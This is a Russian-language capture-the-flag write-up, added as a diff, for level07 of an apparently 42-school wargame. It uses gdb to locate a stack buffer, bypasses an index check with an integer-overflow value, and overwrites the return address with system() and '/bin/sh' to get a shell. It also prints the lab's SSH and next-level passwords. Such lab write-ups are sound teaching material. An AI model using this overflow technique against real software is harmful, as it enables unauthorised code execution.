@@ -1,0 +1,92 @@
+## Level07
+
+ssh  level07@192.168.56.101 -p 4242
+password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+
+1. Запускаем `gdb` и смотрим:
+* Где у нас еip, ebp, esp, data:
+```
+b *main+6
+r
+i frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebp at 0xffffd708, eip at 0xffffd70c
+(gdb) i reg esp
+esp            0xffffd6fc	0xffffd6fc
+
+0x24(%esp),%eax
+   0x080488e7 <+452>:	mov    %eax,(%esp)
+---Type <return> to continue, or q <return> to quit---
+   0x080488ea <+455>:	call   0x8048630 <store_number>
+
+```
+посути начало для нашего буффера находится на esp + 0x24 = 0xFFFFD720
+* проверим так ли это, зайдем в store_number и псмотрим что на входе:
+получаем:
+```
+(gdb) x/4x $ebp+0x8
+0xffffd520:	0x44	0xd5	0xff	0xff  -> 0xffffd544
+```
+* вдимо не попали и мы не веделили стек, бахаем поинт на *main+126
+```
+(gdb) i reg esp
+esp            0xffffd520	0xffffd520
+посути начало для нашего буффера находится на esp + 0x24 = 0xFFFFD544
+```
+
+Ура мы нашли начало нашего буффера, посчитаем сколько нам нужно до eip:
+
+eip - esp + 0x24 = 456 между началом сторы и eip, 456 / 4 = 114 интовых чисел
+* В механизме чтения есть проверка делимости на 3, попробуем переполнить инт: Нам нужно получить 456 добавим целый инт =
+(4294967296 + 456) / 4 = 1073741938 Получается так что это смещение нам ганатирует переполнение стека с заходом на eip
+
+* Запускать будет system("/bin/sh"), найдем system и строку "/bin/sh" затрем eip и подадим аргементом строку /bin/sh
+```
+(gdb) b *main
+Breakpoint 1 at 0x8048723
+(gdb) r
+Starting program: /home/users/level07/level07
+Breakpoint 1, 0x08048723 in main ()
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 = 4159090384 <system>
+
+(gdb) find &system, +99999999, "/bin/sh"
+0xf7f897ec = 4160264172
+```
+* Прохождение:
+```
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+
+Input command: quit
+
+$ whoami
+level08
+
+$ cd /home/users/level08
+cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
